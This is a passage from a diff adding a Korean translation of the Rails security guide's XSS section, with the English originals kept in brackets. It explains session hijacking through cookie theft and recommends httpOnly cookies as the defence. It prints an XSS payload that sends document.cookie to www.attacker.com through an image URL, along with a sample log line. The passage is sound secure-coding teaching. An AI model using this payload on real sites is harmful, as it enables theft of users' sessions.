+이상에서 보여준 예제 코드는 현재상태에서는 전혀 피해를 주지 않지만, 공격자가 사용자의 쿠키를 훔쳐서 세션을 가로채는 방법을 알아 보겠습니다. 자바스크립트에서, document.cookie 속성을 이용해서 문서의 쿠키를 읽고 쓸수 있습니다. 자바스크립트는 same origin policy를 강제하는데, 특정 도메인의 스크립트는 다른 도메인의 쿠키를 접근할 수 없다는 것을 의미합니다. document.cookie 속성은 페이지를 응답으로 보낸 웹서버의 쿠키값을 가지고 있습니다. 그러나, XSS에서 일어나는 것 처럼, HTML 문서내에 스크립트 코드를 직접 삽입해 둘 경우 이 속성값을 읽고 쓸수 있게 됩니다. 결과 페이지에 쿠키값을 보고 싶을 때는 웹어플리케이션내의 아무곳에 아래의 코드를 주입해 주면 됩니다. [[[These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). In JavaScript you can use the document.cookie property to read and write the document's cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:]]]
 
 ```
 <script>document.write(document.cookie);</script>
 ```
 
-For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server's access log files to see the victim's cookie.
+물론 공격자들에게는 희생자가 자신의 쿠키값을 볼 것이기 때문에 이와 같은 스크립트 코드는 유용하지 않습니다. 아래의 예제 코드는 http://www.attacker.com/ 주소에 쿠키값을 조합한 URL로부터 아미지를 로드하려고 시도할 것입니다. 물론, 이 URL은 존재하지 않기 때문에 브라우저상에 아무것도 보여 주지 않게 됩니다. 그러나 공격자는 자신의 웹서버의 접근 로그 파일에서 희생자의 쿠키값을 알 수 있게 됩니다. [[[For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server's access log files to see the victim's cookie.]]]
 
 ```html
 <script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
 ```
 
-The log files on www.attacker.com will read like this:
+www.attacker.com 의 로그파일에서 아래와 같은 내용을 알 수 있을 것입니다. [[[The log files on www.attacker.com will read like this:]]]
 
 ```
 GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
 ```
 
-You can mitigate these attacks (in the obvious way) by adding the [httpOnly](http://dev.rubyonrails.org/ticket/8895) flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies [will still be visible using Ajax](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/), though.
+[httpOnly](http://dev.rubyonrails.org/ticket/8895) 플래그를 쿠키에 추가해 주는 거와 같은 확실한 조치를 취하면 이러한 공격을 줄일 수 있는데 document.cookie는 자바스크립트가 읽을 수 없게 될 수 있습니다. Http only 쿠키는 IE v6.SP1, 파이어폭스 v2.0.0.5, 오페라 9.5 에서 사용하고 있지만 사파리는 여전히 고려 중에 있고 해당 옵션을 무시해 버립니다. 그러나 WebTV와 IE 5.5 on Mac 과 같은 다른 구버전의 브라우저들은 실제로 해당 페이지를 로드하지 못할 수 있습니다. 그러나 쿠키는 [Ajax를 이용할 경우 여전히 보일 수 있기 때문](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/)에 주의가 필요합니다. [[[You can mitigate these attacks (in the obvious way) by adding the [httpOnly](http://dev.rubyonrails.org/ticket/8895) flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies [will still be visible using Ajax](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/), though.]]]
 
 ##### Defacement
 
